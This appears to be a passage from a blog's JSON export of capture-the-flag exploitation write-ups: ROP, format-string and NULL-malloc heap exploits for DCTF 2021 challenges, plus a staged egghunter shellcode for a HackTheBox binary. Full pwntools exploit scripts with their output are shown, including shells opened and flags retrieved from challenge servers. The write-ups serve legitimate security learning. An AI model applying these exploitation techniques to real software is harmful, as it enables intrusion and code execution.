0x000000000000118d \u0026lt;+8\u0026gt;: mov DWORD PTR [rbp-0x4],edi 0x0000000000001190 \u0026lt;+11\u0026gt;: mov DWORD PTR [rbp-0x8],esi 0x0000000000001193 \u0026lt;+14\u0026gt;: mov edx,DWORD PTR [rbp-0x4] 0x0000000000001196 \u0026lt;+17\u0026gt;: mov eax,DWORD PTR [rbp-0x8] 0x0000000000001199 \u0026lt;+20\u0026gt;: add eax,edx 0x000000000000119b \u0026lt;+22\u0026gt;: cmp eax,0xdeadc0de 0x00000000000011a0 \u0026lt;+27\u0026gt;: jne 0x11d9 \u0026lt;loss+84\u0026gt; 0x00000000000011a2 \u0026lt;+29\u0026gt;: lea rdi,[rip+0xe5f] # 0x2008 0x00000000000011a9 \u0026lt;+36\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x00000000000011ae \u0026lt;+41\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1337c0de 0x00000000000011b5 \u0026lt;+48\u0026gt;: jne 0x11d9 \u0026lt;loss+84\u0026gt; 0x00000000000011b7 \u0026lt;+50\u0026gt;: lea rdi,[rip+0xe7a] # 0x2038 0x00000000000011be \u0026lt;+57\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x00000000000011c3 \u0026lt;+62\u0026gt;: lea rdi,[rip+0x2ea6] # 0x4070 \u0026lt;win_land\u0026gt; 0x00000000000011ca \u0026lt;+69\u0026gt;: call 0x1040 \u0026lt;system@plt\u0026gt; 0x00000000000011cf \u0026lt;+74\u0026gt;: mov edi,0x0 0x00000000000011d4 \u0026lt;+79\u0026gt;: call 0x1080 \u0026lt;exit@plt\u0026gt; 0x00000000000011d9 \u0026lt;+84\u0026gt;: nop 0x00000000000011da \u0026lt;+85\u0026gt;: leave 0x00000000000011db \u0026lt;+86\u0026gt;: ret End of assembler dump. gef➤ There’s some twist to the loss function, first it expects 2 arguments from the function call then it checks if the sum of 1st and 2nd argument is equals to the 0xdeadc0de if it is, then check if the first argument is equal to the 0x1337c0de once it is, calls the system with the win_land as it’s argument. In order to exploit this, with the gef we find the offset which was 0x28. then we must call californiaand silicon_valley respectively to make the win_land variable equals to /bin/sh then call the loss function.\nDuring the call of the loss function, since we know that it expects the 1st argument to be the 0x1337c0de and the sum of 1st and 2nd should be 0xdeadc0de, we can just find the right value for the second argument by subtracting the 0xdeadc0de from the 0x1337c0de which will be:-\ngef➤ p 0xdeadc0de - 0x1337c0de $4 = 0xcb760000 gef➤ Now, the exploit will be:-\nfrom pwn import* p = remote(\u0026#34;dctf1-chall-hotel-rop.westeurope.azurecontainer.io\u0026#34;, 7480) elf = ELF(\u0026#34;hotel_rop\u0026#34;) p.recvuntil(\u0026#34;Welcome to Hotel ROP, on main street \u0026#34;) elf.address = int(p.recvline().strip(), 16) - 0x136d print(hex(elf.address)) payload = b\u0026#34;A\u0026#34;*40 payload += p64(elf.symbols[\u0026#39;california\u0026#39;]) payload += p64(elf.symbols[\u0026#39;silicon_valley\u0026#39;]) payload += p64(elf.address + 0x000000000000140b) payload += p64(0x1337c0de) payload += p64(elf.address + 0x0000000000001409) payload += p64(0xcb760000)*2 payload += p64(elf.symbols[\u0026#39;loss\u0026#39;]) p.send(payload) p.interactive() Running the exploit:-\n❯ python3 hotel_rop.py [+] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done [*] \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/hotel_rop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 0x564fdcdc6000 [*] Switching to interactive mode You come here often? I think you should come here more often. Welcome to Hotel California You can sign out anytime you want, but you can never leave You want to work for Google? $ id uid=1000(pilot) gid=1000(pilot) groups=1000(pilot) $ cat flag.txt dctf{ch41n_0f_h0t3ls}$ [*] Interrupted Formats last theorem #This was another format string challenge, performing the checksec on the binary we get the:-\ngef➤ checksec [+] checksec for \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/formats_the_theorem\u0026#39; Canary : ✘ NX : ✓ PIE : ✓ Fortify : ✘ RelRO : Full gef➤ We have almost all the protections enabled, since RELRO is Full meaning we won’t be able to overwrite the GOT entries and since the challenge description hint us toward the __malloc_hook, we have to go the usual way to overwrite the __malloc_hook with the one_gadget address and call the malloc with the help of printf which will eventually call __malloc_hook resulting in the one_gadget being executed.\nReference: https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/\nAlso, since the attachment had the docker container to hint towards LIBC, we can see that the binary was running in the Ubuntu 18.04 container which uses the LIBC 2.27ubuntu1.4 version, there was vuln function, which had format string vulnerabilty:-\ngef➤ disas vuln Dump of assembler code for function vuln: 0x000000000000073a \u0026lt;+0\u0026gt;: push rbp 0x000000000000073b \u0026lt;+1\u0026gt;: mov rbp,rsp 0x000000000000073e \u0026lt;+4\u0026gt;: sub rsp,0x70 0x0000000000000742 \u0026lt;+8\u0026gt;: mov rax,QWORD PTR fs:0x28 0x000000000000074b \u0026lt;+17\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x000000000000074f \u0026lt;+21\u0026gt;: xor eax,eax 0x0000000000000751 \u0026lt;+23\u0026gt;: lea rdi,[rip+0x100] # 0x858 0x0000000000000758 \u0026lt;+30\u0026gt;: call 0x5e0 \u0026lt;puts@plt\u0026gt; 0x000000000000075d \u0026lt;+35\u0026gt;: lea rax,[rbp-0x70] 0x0000000000000761 \u0026lt;+39\u0026gt;: mov rsi,rax 0x0000000000000764 \u0026lt;+42\u0026gt;: lea rdi,[rip+0x136] # 0x8a1 0x000000000000076b \u0026lt;+49\u0026gt;: mov eax,0x0 0x0000000000000770 \u0026lt;+54\u0026gt;: call 0x610 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0000000000000775 \u0026lt;+59\u0026gt;: lea rdi,[rip+0x12b] # 0x8a7 0x000000000000077c \u0026lt;+66\u0026gt;: call 0x5e0 \u0026lt;puts@plt\u0026gt; 0x0000000000000781 \u0026lt;+71\u0026gt;: lea rax,[rbp-0x70] 0x0000000000000785 \u0026lt;+75\u0026gt;: mov rdi,rax 0x0000000000000788 \u0026lt;+78\u0026gt;: mov eax,0x0 0x000000000000078d \u0026lt;+83\u0026gt;: call 0x5f0 \u0026lt;printf@plt\u0026gt; 0x0000000000000792 \u0026lt;+88\u0026gt;: lea rdi,[rip+0x11a] # 0x8b3 0x0000000000000799 \u0026lt;+95\u0026gt;: call 0x5e0 \u0026lt;puts@plt\u0026gt; 0x000000000000079e \u0026lt;+100\u0026gt;: lea rdi,[rip+0x10e] # 0x8b3 0x00000000000007a5 \u0026lt;+107\u0026gt;: call 0x5e0 \u0026lt;puts@plt\u0026gt; 0x00000000000007aa \u0026lt;+112\u0026gt;: jmp 0x751 \u0026lt;vuln+23\u0026gt; End of assembler dump. So, in order to exploit this binary, we first needed a LIBC leak to determine the base address of LIBC so that we will be able to determine the __malloc_hook and one_gadget address. Surprisingly, one of the LIBC address at the offset of 2, which I used to get the base address of the LIBC, then using the pwntools fmtstr_payload to write 2 bytes at a time.\nfrom pwn import * #p = process(\u0026#34;./formats_the_theorem\u0026#34;) context.arch = \u0026#34;amd64\u0026#34; p = remote(\u0026#34;dctf-chall-formats-last-theorem.westeurope.azurecontainer.io\u0026#34;, 7482) libc = ELF(\u0026#34;libc.so.6\u0026#34;) p.recvline() p.sendline(\u0026#34;%2$p\u0026#34;) p.recvline() libc.address = int(p.recvline().strip(), 16) - 0x3ed8c0 log.info(\u0026#34;LIBC: 0x%x\u0026#34; %(libc.address)) one_gadget = libc.address + 0x4f432 malloc_hook = libc.sym[\u0026#34;__malloc_hook\u0026#34;] target = one_gadget addr = malloc_hook count = 0 while target: payload = fmtstr_payload(6, {addr: target \u0026amp; 0xffff}, write_size=\u0026#39;short\u0026#39;) p.sendline(payload) addr += 2 target \u0026gt;\u0026gt;= 16 count += 1 p.sendline(\u0026#34;%66000c\u0026#34;) p.interactive() Running the exploit:-\n❯ python3 formats_the_theorem.py [+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done [*] \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] LIBC: 0x7f483a4b2000 [*] Switching to interactive mode I won\u0026#39;t ask you, what your name is. It\u0026#39;s getting kinda old at this point you entered [..snip..] I won\u0026#39;t ask you, what your name is. It\u0026#39;s getting kinda old at this point you entered [..snip..] I won\u0026#39;t ask you, what your name is. It\u0026#39;s getting kinda old at this point you entered [..snip..] $ id uid=1000(pilot) gid=1000(pilot) groups=1000(pilot) $ cat flag.txt dctf{N0t_all_7h30r3ms_s0und_g00d} $ [*] Interrupted Just another heap #This challenge was solved by Faith, later he shared the exploit script for the challenge, he told me:-\nit was a simple bug, malloc returned null but they didnt check for null and just added a controlled value to it(edited) [12:51 PM] PIE was disabled, so u can make malloc return null with a large size, then add any value to create a pointer to any memory address\nChecking the binary with the checksec:-\ngef➤ checksec [+] checksec for \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/just_another_heap\u0026#39; Canary : ✓ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial gef➤ The vulnerability existed in the function Create Memory:-\nunsigned __int64 create_memory() { unsigned __int64 v0; // rbx const char *name; // rbx int important; // [rsp+4h] [rbp-4Ch] int recent; // [rsp+8h] [rbp-48h] int i; // [rsp+Ch] [rbp-44h] size_t size; // [rsp+10h] [rbp-40h] BYREF size_t offset; // [rsp+18h] [rbp-38h] BYREF unsigned __int64 idx; // [rsp+20h] [rbp-30h] BYREF char *chunk; // [rsp+28h] [rbp-28h] char is_important[2]; // [rsp+34h] [rbp-1Ch] BYREF char is_recent[2]; // [rsp+36h] [rbp-1Ah] BYREF unsigned __int64 v12; // [rsp+38h] [rbp-18h] v12 = __readfsqword(0x28u); if ( dword_6020C0 \u0026gt; 9 ) { puts(\u0026#34;You already have to many memories stored in here. You don\u0026#39;t want another one.\u0026#34;); } else { important = 0; recent = 0; idx = 0LL; puts(\u0026#34;at what page would you like to write?\u0026#34;); read_long((__int64)\u0026amp;idx); if ( heap_list[idx] || idx \u0026gt; 9 ) { puts(\u0026#34;there is already something written at that page.\u0026#34;); } else { puts(\u0026#34;name:\u0026#34;); v0 = idx; struct_list[v0] = malloc(0x20uLL); read_data((char *)struct_list[idx], 16); name = (const char *)struct_list[idx]; name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; puts(\u0026#34;How long is your memory\u0026#34;); read_long((__int64)\u0026amp;size); chunk = (char *)malloc(size); puts(\u0026#34;Sometimes our memories fade and we only remember parts of them.\u0026#34;); read_long((__int64)\u0026amp;offset); puts(\u0026#34;Would you like to leave some space at the beginning in case you remember later?\u0026#34;); if ( offset \u0026lt;= size ) { if ( chunk ) { for ( i = 0; i \u0026lt; offset; ++i ) chunk[i] = 95; } chunk += offset; fflush(stdin); puts(\u0026#34;What would you like to write\u0026#34;); read_data(chunk, size - offset); puts(\u0026#34;Would you say this memory is important to you? [Y/N]\u0026#34;); read_data(is_important, 2); if ( is_important[0] == 89 ) important = 1; _IO_getc(stdin); puts(\u0026#34;Would you say this memory was recent? [Y/N]\u0026#34;); read_data(is_recent, 2); if ( is_recent[0] == 89 ) recent = 1; heap_list[idx] = chunk; recent_list[idx] = recent; important_list[idx] = important; offset_list[idx] = offset; size_list[idx] = size; ++dword_6020C0; puts(\u0026#34;Memory created successfully\\n\u0026#34;); puts(byte_401786); fflush(stdin); } else { puts(\u0026#34;Invalid offset\u0026#34;); } } } return __readfsqword(0x28u) ^ v12; } The vulnerability was that the program doesn’t check whether the pointer returned by the malloc is valid or not, the program also allow us to enter a, kind of, offset which will be added to the pointer returned by the malloc, since there’s no check for invalid/NULL return value from the malloc, we can exploit this one by giving a large size of the malloc which will return NULL, then we can give the address of the global array which stores the name pointer, what we will exactly do here is explained as follows:-\n#!/usr/bin/env python3 from pwn import * e = ELF(\u0026#34;./just_another_heap\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) #p = process(\u0026#34;./just_another_heap\u0026#34;, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) p = remote(\u0026#34;dctf-chall-just-another-heap.westeurope.azurecontainer.io\u0026#34;, 7481) def create(idx, name, size, empty, data, important, recent): p.sendlineafter(\u0026#34;Exit\\n\u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;\\n\u0026#34;, str(idx)) p.sendafter(\u0026#34;name:\\n\u0026#34;, name) p.sendlineafter(\u0026#34;memory\\n\u0026#34;, str(size)) p.sendlineafter(\u0026#34;them.\\n\u0026#34;, str(empty)) p.sendafter(\u0026#34;write\\n\u0026#34;, data) if important: p.sendlineafter(\u0026#34;\\n\u0026#34;, \u0026#34;Y\u0026#34;) else: p.sendlineafter(\u0026#34;\\n\u0026#34;, \u0026#34;N\u0026#34;) if recent: p.sendlineafter(\u0026#34;\\n\u0026#34;, \u0026#34;Y\u0026#34;) else: p.sendlineafter(\u0026#34;\\n\u0026#34;, \u0026#34;N\u0026#34;) def forget(idx): p.sendlineafter(\u0026#34;Exit\\n\u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;forget?\\n\u0026#34;, str(idx)) def _list(): p.sendlineafter(\u0026#34;Exit\\n\u0026#34;, \u0026#34;5\u0026#34;) With the wrapper functions, we select the address where the very last name would be stored, which in our case is 0x6022a8\nmemory_ptr_last_idx = 0x6022a8 puts_got = e.got[\u0026#34;puts\u0026#34;] huge = 0xFFFF0FFFFFFF Then, we firstly create a chunk which will act as a decoy for performing rest of the exploit, we create this chunk, making the 0x6022a8 will point to the BBBBBBBBBBBBBBBB. We will also create a chunk with the name being /bin/sh\\x00\ncreate(9, \u0026#34;A\u0026#34;*0xF, 0x10, 0, \u0026#34;B\u0026#34;*0xF, False, False) create(2, \u0026#34;A\u0026#34;*0xF, 0xa, 0, b\u0026#34;/bin/sh\\x00\\n\u0026#34;, False, False) Now, we will force the malloc to return NULL then make the offset to the pointer of the last chunk[9] which we overwrite with GOT address of the puts, giving us a LIBC leak.\ncreate(0, \u0026#34;A\u0026#34;*0xF, memory_ptr_last_idx + (huge - memory_ptr_last_idx), memory_ptr_last_idx, p64(puts_got) + b\u0026#34;\\n\u0026#34;, False, False) _list() p.recvuntil(\u0026#34;9: \u0026#34;) libc.address = int.from_bytes(p.recvline(), byteorder=\u0026#34;little\u0026#34;) \u0026amp; 0xFFFFFFFFFFFF - libc.sym[\u0026#34;puts\u0026#34;] system = libc.sym[\u0026#34;system\u0026#34;] free_hook = libc.sym[\u0026#34;__free_hook\u0026#34;] log.info(\u0026#34;Libc base @ \u0026#34; + hex(libc.address)) Now, doing the same, but this time we will force the malloc to again return the NULL and make the offset value to the address of the __free_hook.\ncreate(1, \u0026#34;A\u0026#34;*0xF, free_hook + (huge - free_hook), free_hook, p64(system) + b\u0026#34;\\n\u0026#34;, False, False) Now, we just free the chunk 2 which had the /bin/sh string stored resulting in system(\u0026quot;/bin/sh\u0026quot;):-\nforget(2) p.interactive() Run the exploit:-\nvagrant@ubuntu-bionic:~/sharedFolder/CTFs/ductf$ python3 just_another_heap.py [*] \u0026#39;/home/vagrant/sharedFolder/CTFs/ductf/just_another_heap\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/home/vagrant/sharedFolder/CTFs/ductf/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./just_another_heap\u0026#39;: pid 1865 [*] Libc base @ 0x7f83be251000 [*] Switching to interactive mode $ id uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) $ [*] Interrupted vagrant@ubuntu-bionic:~/sharedFolder/CTFs/ductf$ ","date":"7 May 2021","permalink":"/posts/ductf/","section":"Posts","summary":"I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.","title":"DCTF - 2021"},{"content":"","date":null,"permalink":"/tags/pwn-ctf-__malloc_hook-rop-pwntools/","section":"Tags","summary":"","title":"Pwn, Ctf, __Malloc_hook, Rop, Pwntools"},{"content":"This challenge was quite good, as someone who never really did egghunting shellcode, this was a good learning experience. So, the binary given s pretty simple, all the protections have been disabled except the PIE but, analysing the workflow, we can see that it reads shellcode and then execute that shellcode.\n4mianwayne@oracle:~/Pwning/HackTheBox$ checksec hunting [*] \u0026#39;/home/d4mianwayne/Pwning/HackTheBox/hunting\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Reverse Engineering #In the binary itself, the main functions seems to be doing\nint sub_1374() { void *addr; // ST2C_4 void *buf; // ST24_4 int v3; // [esp-10h] [ebp-24h] int v4; // [esp-Ch] [ebp-20h] int v5; // [esp-8h] [ebp-1Ch] int v6; // [esp-4h] [ebp-18h] char *dest; // [esp+4h] [ebp-10h] addr = (void *)sub_12E8(); signal(14, (__sighandler_t)\u0026amp;exit); alarm(3u); dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0); if ( dest == (char *)-1 ) sub_1118(-1, v3, v4, v5); strcpy(dest, aHtbXxxxxxxxxxx); memset(aHtbXxxxxxxxxxx, 0, 0x25u); sub_1259(); buf = malloc(0x3Cu); read(0, buf, 0x3Cu); ((void (__stdcall *)(int, void *, _DWORD))buf)(v6, buf, 0); return 0; } Here, if gets the address from the following function:-\nint sub_12E8() { unsigned int buf; // [esp+0h] [ebp-18h] int fd; // [esp+8h] [ebp-10h] int i; // [esp+Ch] [ebp-Ch] fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, \u0026amp;buf, 8u); close(fd); srand(buf); for ( i = 0; i \u0026lt;= 1610612735 || (unsigned int)i \u0026gt; 0xF7000000; i = rand() \u0026lt;\u0026lt; 16 ) ; return i; } This one seems to setting the seed of the random taken from the /dev/urandom and then calling the rand() a large number of times and returns it after certain number of iterations, so this is unpredictably random.\nThen after getting a random address, it calls mmap to allocate a memory pointed by the randomized address, then copies the flag string to that region, after that it reads 0x30 bytes from the stdin and calls the given input, hence it is reading a shellcode which will be called later on. It also makes the memmory 0 pointed by the flag before calling the read, things got a bit more complicated here but we have shellcode execution :)\nInitial Idea #Running it in gdb, we can see:-\ngef➤ r Starting program: /home/d4mianwayne/Pwning/HackTheBox/hunting AAAAAAAAAAAAAAAAAAA Program received signal SIGSEGV, Segmentation fault. 0x5657c000 in ?? () [ ..snip.. ] [ Legend: Modified register | Code | Heap | Stack | String ] ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $eax : 0x5655a194 → 0x00000084 $ebx : 0x56559000 → clc $ecx : 0x5655a1b3 → 0x000000ab $edx : 0x3c $esp : 0xffffd008 → 0x0000002b (\u0026#34;+\u0026#34;?) $ebp : 0xffffd028 → 0x00000000 $esi : 0xf7fae000 → 0x001ead6c $edi : 0xf7fae000 → 0x001ead6c $eip : 0x5657c000 $eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0xffffd008│+0x0000: 0x0000002b (\u0026#34;+\u0026#34;?)\t← $esp 0xffffd00c│+0x0004: 0x5655644f → mov eax, 0x0 0xffffd010│+0x0008: 0x00000001 0xffffd014│+0x000c: 0x5655a1a0 → 0x41414141 0xffffd018│+0x0010: 0x00000000 0xffffd01c│+0x0014: 0x00000000 0xffffd020│+0x0018: 0xffffd040 → 0x00000001 0xffffd024│+0x001c: 0x00000000 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ──── [!] Cannot disassemble from $PC [!] Cannot access memory at address 0x5657c000 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;hunting\u0026#34;, stopped 0x5657c000 in ?? (), reason: SIGSEGV ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ After fiddling around much, and examing the memory sections, we can see the flag is loaded into the mmap\u0026rsquo;d page:-\ngef➤ search-pattern HTB{ [+] Searching \u0026#39;HTB{\u0026#39; in memory [+] In \u0026#39;/dev/zero (deleted)\u0026#39;(0x74b90000-0x74b91000), permission=rwx 0x74b90000 - 0x74b90024 → \u0026#34;HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\u0026#34; gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x56555000 0x56558000 0x00000000 r-x /home/d4mianwayne/Pwning/HackTheBox/hunting 0x56558000 0x56559000 0x00002000 r-x /home/d4mianwayne/Pwning/HackTheBox/hunting 0x56559000 0x5655a000 0x00003000 rwx /home/d4mianwayne/Pwning/HackTheBox/hunting 0x5655a000 0x5657c000 0x00000000 rwx [heap] 0x74b90000 0x74b91000 0x00000000 rwx /dev/zero (deleted) 0xf7dc3000 0xf7fab000 0x00000000 r-x /usr/lib/i386-linux-gnu/libc-2.31.so 0xf7fab000 0xf7fac000 0x001e8000 --- /usr/lib/i386-linux-gnu/libc-2.31.so 0xf7fac000 0xf7fae000 0x001e8000 r-x /usr/lib/i386-linux-gnu/libc-2.31.so 0xf7fae000 0xf7fb0000 0x001ea000 rwx /usr/lib/i386-linux-gnu/libc-2.31.so 0xf7fb0000 0xf7fb2000 0x00000000 rwx 0xf7fcb000 0xf7fcd000 0x00000000 rwx 0xf7fcd000 0xf7fd0000 0x00000000 r-- [vvar] 0xf7fd0000 0xf7fd1000 0x00000000 r-x [vdso] 0xf7fd1000 0xf7ffb000 0x00000000 r-x /usr/lib/i386-linux-gnu/ld-2.31.so 0xf7ffc000 0xf7ffd000 0x0002a000 r-x /usr/lib/i386-linux-gnu/ld-2.31.so 0xf7ffd000 0xf7ffe000 0x0002b000 rwx /usr/lib/i386-linux-gnu/ld-2.31.so 0xfffdd000 0xffffe000 0x00000000 rwx [stack] Paying close attention to these, flag resides in 0x74b90000 - 0x74b90024 → \u0026quot;HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\u0026quot; which when we see in vmmap which shows the numbers of the memory pages used by the executable turns out to be from the ummap\u0026rsquo;d region.\n0x74b90000 0x74b91000 0x00000000 rwx /dev/zero (deleted) So, therefore, what we see here is the flag belongs to a 0 initialized memory region, what can we do now?\nThere\u0026rsquo;s a shellcode technique called egghunting which is used to search for EGG which could be string/address/byte/DWORD or anything which resides in memory which we want to search for, since the memory region where the flag resides still belongs to the binary process image, we can use egghunting technique shellcode and once we get the memory pointed to the HTB{ we can print it by just calling write.\nExploit Development and Debugging #So, without further ado, let\u0026rsquo;s start, what we can do here is now:-\nCall egghunting shellcode and search for string HTB{ in the process image. Once found, print it with the write Let\u0026rsquo;s start by first finding the HTB string:-\nWith the help of the shellcraft.egghunter(string, starting_address) of pwntools, we can give the string we want to find and the starting address to let it prepare the shellcode for us.\nfrom pwn import * context.arch = \u0026#34;i386\u0026#34; p = process(\u0026#34;./hunting\u0026#34;) shellcode = asm(shellcraft.egghunter(b\u0026#34;HTB{\u0026#34;, 0x50000000)) pause() p.send(shellcode) p.interactive() NOTE: Since PIE is enabled, the base address for the binary would start from here, more or less, 0x50000000 marking it as starting address saved seconds(I am picky).\nRunning the exploit and attaching it to the gdb:-\n[ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────────────────── registers ──── $eax : 0xfffffffe $ebx : 0x69df0000 → \u0026#34;HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\u0026#34; $ecx : 0x0 $edx : 0x400 $esp : 0xfff30008 → 0x7b425448 (\u0026#34;HTB{\u0026#34;?) $ebp : 0xfff30028 → 0x00000000 $esi : 0xfff3000c → 0x5655b44f → mov eax, 0x0 $edi : 0x69df0004 → \u0026#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\u0026#34; $eip : 0x579fe1d9 → 0x29000000 Nice, we have the flag in ebx register, so, we can now just do\nwrite(1, $ebx, 0x100) where ebx is a memory pointer to the flag.\nThe Length Issue #Okay, so at this time I did\nfrom pwn import * context.arch = \u0026#34;i386\u0026#34; p = process(\u0026#34;./hunting\u0026#34;) shellcode += asm(shellcraft.egghunter(b\u0026#34;HTB{\u0026#34;, 0x50000000)) shellcode += asm(shellcraft.write(1, \u0026#34;ebx\u0026#34;, 36)) pause() p.send(shellcode) p.interactive() But I forgot that the length allowed was only 0x30 which was pretty much taken by the egghunter shellcode, so we need something to act as a stager shellcode. So, to do work through this, what we can do is call read to make the binary read large amount of input.\nThe shellcode would be as follows:-\nxor eax, eax mov al, 3 xor ebx, ebx mov dl, 0xff int 0x80 To understand the shellcode, we xor\u0026rsquo;d the eax to make it 0 then we move 3 to the lower 16 bit of the register eax pointed by al, then we xor\u0026rsquo;d ebx register which will make it 0 as well, after that we move 0xff to the lower 16 bits of the edx pointed by dl, then we do int 0x80 to do a syscall.\nSo, here:-\nread(ebx, ecx, edx) Where ebx points to the fd, as it has been XOR\u0026rsquo;d it contains 0 which the fd of the stdin then ecx when the time of the execution of the shellcode pointes to the buffer itself, so we don\u0026rsquo;t manipulate it\u0026rsquo;s value, next, edx contains the size which is 0xff, more than enough for us.\neax points to the syscall number, read syscall number is 3 and the int 0x80 is used to tell the program we are making syscall, since eax is 3 the read will be made.\nNow, let\u0026rsquo;s check if it works:-\nfrom pwn import * context.arch = \u0026#34;i386\u0026#34; p = process(\u0026#34;./hunting\u0026#34;) shellcode = asm(\u0026#34;\u0026#34;\u0026#34; xor eax, eax mov al, 3 xor ebx, ebx mov dl, 0xff int 0x80\u0026#34;\u0026#34;\u0026#34;) log.info(\u0026#34;SHELLCODE LENGTH: %d\u0026#34; %(len(shellcode))) pause() p.send(shellcode) p.interactive() Running it and attaching gdb to one side:-\nd4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py [+] Starting local process \u0026#39;./hunting\u0026#39;: pid 23502 [*] SHELLCODE LENGTH: 10 [*] Paused (press any to continue) [*] Switching to interactive mode $ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ In gdb window:-\n[ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────────────────── registers ──── $eax : 0xffe9941b → \u0026#34;i686\u0026#34; $ebx : 0x1f $ecx : 0xf $edx : 0xffe9bfee → 0x75682f2e (\u0026#34;./hu\u0026#34;?) $esp : 0xffe993f4 → 0x00000000 $ebp : 0x1a $esi : 0xffe9940b → 0x0d4809be $edi : 0x19 $eip : 0x5754f1c8 → \u0026#34;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]\u0026#34; The eip points to the input we gave but certainly not from the start, let\u0026rsquo;s check the offset:-\ngef➤ pattern search kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa [+] Searching \u0026#39;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa\u0026#39; [+] Found at offset 40 (big-endian search) This done, we will just know that:-\npayload = b\u0026#34;A\u0026#34;*40 payload += shellcode We are almost done.\nNow, we will just add shellcraft.write(1, 'ebx', 36) with our previous work and we are done :)\nThe final exploit looks like:-\nfrom pwn import * context.arch = \u0026#34;i386\u0026#34; p = process(\u0026#34;./hunting\u0026#34;) # Send the stager shellcode to read the bigger shellcode later shellcode = asm(\u0026#34;\u0026#34;\u0026#34; xor eax, eax mov al, 3 xor ebx, ebx mov dl, 0xff int 0x80\u0026#34;\u0026#34;\u0026#34;) log.info(\u0026#34;SHELLCODE LENGTH: %d\u0026#34; %(len(shellcode))) p.send(shellcode) shellcode = b\u0026#34;A\u0026#34;*40 # Offset to the EIP # The Egghunter shellcode to search for the memory having `HTB{` strting shellcode += asm(shellcraft.egghunter(b\u0026#34;HTB{\u0026#34;, 0x50000000)) # Once found, the `ebx` points to the flag, so we just print it shellcode += asm(shellcraft.write(1, \u0026#34;ebx\u0026#34;, 36)) p.send(shellcode) # Recieve the flag flag = p.recvuntil(\u0026#34;}\u0026#34;) log.success(\u0026#34;FLAG: %s\u0026#34; %(flag)) p.close() That aside, let\u0026rsquo;s run it and this time without gdb:-\nd4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py [+] Starting local process \u0026#39;./hunting\u0026#39;: pid 23649 [*] SHELLCODE LENGTH: 10 [+] FLAG: b\u0026#39;HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\u0026#39; [*] Stopped process \u0026#39;./hunting\u0026#39; (pid 23649) Voila, we get the flag, let\u0026rsquo;s run the exploit for the remote server:-\nd4mianwayne@oracle:~/Pwning/HackTheBox$ python3 hunting.py [+] Opening connection to 165.232.101.10 on port 31335: Done [*] SHELLCODE LENGTH: 10 [+] FLAG: b\u0026#39;HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}\u0026#39; [*] Closed connection to 165.232.101.10 port 31335 And done!\nThat was quite a nice ride, 